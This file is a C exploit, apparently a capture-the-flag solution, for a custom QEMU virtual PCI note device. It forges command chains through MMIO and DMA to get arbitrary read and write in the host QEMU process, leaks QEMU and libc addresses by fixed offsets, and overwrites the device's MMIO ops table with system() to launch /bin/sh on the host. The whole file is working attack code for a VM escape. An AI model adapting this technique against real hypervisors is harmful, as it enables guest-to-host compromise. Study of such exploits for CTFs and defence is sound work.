#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>

#define PATH "/sys/devices/pci0000:00/0000:00:04.0/resource0"

#define REG_NOTE_COMMAND 0
#define REG_LOW_CMD_CHAIN_ADDR 1
#define REG_HIGH_CMD_CHAIN_ADDR 2

#define CMD_SUBMIT_NOTE   0x10
#define CMD_DELETE_NOTE     0x11
#define CMD_READ_NOTE     0x12
#define CMD_EDIT_NOTE     0x13
#define CMD_DUPLICATE_NOTE   0x14
#define CMD_ENCRYPT_NOTE   0x15
#define CMD_END_CHAIN     0x16
#define CMD_RESET     0x17

#define NOTE_SUCCESS    0x00
#define NOTE_RESET    0x01
#define NOTE_FAIL   0xff

typedef struct NoteCmdHdr {
    uint32_t cmd_type;
    uint32_t res;
    uint32_t note_id;
    uint32_t note_size;
    uint32_t encrypt_offset;
    uint32_t new_note_id;
    uint64_t note_addr;
} NoteCmdHdr;

unsigned char* iomem;
unsigned char* dmabuf;
unsigned char* databuf;

uint64_t dmabuf_phys_addr;
uint64_t databuf_phys_addr;

uint64_t dma_off;
uint64_t data_off;

uint64_t regs_addr;
uint64_t qemu_base;
uint64_t ms_addr;

uint64_t mmio_ops;
uint64_t libc_base;
uint64_t system_addr;

void die(const char* msg) {
    perror(msg);
    exit(-1);
}

uint64_t virt2phys(void* p) {
    uint64_t virt = (uint64_t)p;
    assert((virt & 0xfff) == 0);
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
            die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);
    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
            die("read");
    
    assert(phys & (1ULL << 63));
    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void iowrite(uint64_t addr, uint32_t value) {
    *((uint64_t*)(iomem + addr)) = value;
}

uint32_t ioread(uint64_t addr) {
    return *((uint64_t*)(iomem + addr));
}

void write_reg(uint64_t reg, uint32_t value) {
    iowrite(reg * 4, value);
}

uint32_t read_reg(uint64_t reg) {
    return ioread(reg * 4);
}

void add_command(NoteCmdHdr *hdr) {
    memcpy(dmabuf + dma_off, hdr, sizeof(NoteCmdHdr));
    dma_off += sizeof(NoteCmdHdr);
}

void add_note(uint32_t id, uint32_t size, unsigned char *content) {
    NoteCmdHdr hdr = { 
        .cmd_type = CMD_SUBMIT_NOTE,
        .note_id = id,
        .note_size = size,
        .note_addr = databuf_phys_addr + data_off,
    };
    add_command(&hdr);

    memcpy(databuf + data_off, content, size);
    data_off += size;
}


void edit_note(uint32_t id, uint32_t size, unsigned char *content) {
    NoteCmdHdr hdr = { 
        .cmd_type = CMD_EDIT_NOTE,
        .note_id = id,
        .note_size = size,
        .note_addr = databuf_phys_addr + data_off,
    };
    add_command(&hdr);

    memcpy(databuf + data_off, content, size);
    data_off += size;
}

void read_note(uint32_t id, uint32_t size) {
    NoteCmdHdr hdr = { 
        .cmd_type = CMD_READ_NOTE,
        .note_id = id,
        .note_size = size,
        .note_addr = databuf_phys_addr + data_off,
    };
    add_command(&hdr);
}

void end_chain() {
    NoteCmdHdr hdr = { 
        .cmd_type = CMD_END_CHAIN,
    };
    add_command(&hdr);
}

void fake_note(uint32_t offset, uint32_t id, uint32_t size, uint64_t addr) {
    iowrite(offset, id);
    iowrite(offset + 0x8, size);
    iowrite(offset + 0x10, addr & 0xffffffff);
    iowrite(offset + 0x14, addr >> 32);

    iowrite(0x80, (regs_addr + offset) & 0xffffffff);
    iowrite(0x84, regs_addr >> 32);
}

void arb_read(uint64_t addr, void *dst, uint64_t size) {
    fake_note(0x10, 0x1234, 0xdeadbeef, addr);
    read_note(0x1234, size);
    end_chain();
    write_reg(REG_LOW_CMD_CHAIN_ADDR, dmabuf_phys_addr);
    write_reg(REG_NOTE_COMMAND, 0);
    dma_off = data_off = 0;

    memcpy(dst, databuf + data_off, size);
}

void arb_write(uint64_t addr, void *src, uint64_t size) {
    fake_note(0x10, 0x1234, 0xdeadbeef, addr);
    edit_note(0x1234, size, src);
    end_chain();
    write_reg(REG_LOW_CMD_CHAIN_ADDR, dmabuf_phys_addr);
    write_reg(REG_NOTE_COMMAND, 0);
    dma_off = data_off = 0;
}

int main() {
    char buf[0x100];
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        die("open");

    iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");
     
    printf("iomem @ %p\n", iomem);
    dmabuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    databuf = dmabuf + 0x1000;
    if (dmabuf == MAP_FAILED)
        die("mmap");

    mlock(dmabuf, 0x2000);
    dmabuf_phys_addr = virt2phys(dmabuf);
    databuf_phys_addr = dmabuf_phys_addr + 0x1000;

    printf("DMA buffer (virt) @ %p\n", dmabuf);
    printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);

    regs_addr = ((uint64_t) read_reg(35)) << 32 | read_reg(34) - 0x80;
    printf("regs @ 0x%lx\n", regs_addr);

    ms_addr = regs_addr - 0xb40;
    printf("ms @ 0x%lx\n", ms_addr);

    mmio_ops = ms_addr + 0xa80;
    printf("mmio_ops @ 0x%lx\n", mmio_ops);

    qemu_base = ((uint64_t) read_reg(47)) << 32 | read_reg(46) - 0x92125d;
    printf("qemu base @ 0x%lx\n", qemu_base);

    arb_read(qemu_base + 0x1186200, &libc_base, 8);
    libc_base -= 0x1363c0;
    printf("libc @ 0x%lx\n", libc_base);

    system_addr = libc_base + 0x50d70;

    uint64_t ops[2] = {0};
    ops[0] = 0xdeadbeef; // read
    ops[1] = system_addr; // write

    memset(buf, 0, sizeof(buf));
    // strcpy(buf, "cat /home/pwn/flag*");
    strcpy(buf, "/bin/sh\x00");

    memcpy(buf + 0x50, ops, sizeof(ops));
    arb_write(ms_addr, buf, sizeof(buf));

    uint64_t ptr = ms_addr + 0x50;
    arb_write(mmio_ops, &ptr, 8);
 
    iowrite(123, 456); // trigger
}
